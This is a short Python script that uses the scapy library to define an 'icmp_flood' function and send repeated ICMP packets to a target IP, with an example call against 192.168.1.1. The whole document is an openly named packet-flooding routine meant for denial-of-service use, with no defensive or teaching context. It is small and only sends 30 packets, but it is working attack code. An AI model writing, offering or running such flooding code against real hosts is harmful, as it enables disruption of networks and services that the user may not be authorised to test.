from scapy.all import IP, ICMP, send

def icmp_flood(target_ip):
    ip = IP(dst=target_ip)
    icmp = ICMP()
    packet = ip / icmp

    for x in range (30):
        send(packet, verbose=False)



# Example usage
icmp_flood("192.168.1.1")
